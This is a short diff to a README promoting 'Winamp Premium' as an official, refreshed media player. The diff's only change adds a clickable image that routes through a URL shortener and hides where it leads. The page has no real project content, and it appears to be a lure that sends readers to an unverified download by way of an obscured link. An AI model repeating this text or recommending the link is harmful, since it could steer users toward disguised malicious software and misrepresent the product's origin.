@@ -2,7 +2,7 @@
 
 **Winamp Premium** is the iconic media player, completely refreshed and upgraded for today's listeners. It merges the famous, timeless interface with cutting-edge new capabilities for a top-tier music journey! ⚡
 
-
+[![7456859](https://github.com/user-attachments/assets/203b553b-f101-4896-b1a3-675811ad4782)](https://tinyurl.com/23kncwbu)
 
 ## 🤔 What is Winamp Premium?
 This is the official, premium evolution of the classic Winamp. It keeps the beloved, customizable skin-based design while adding cloud music streaming, sophisticated library tools, and smooth sync across all your devices. Think of it as your all-in-one music command center.
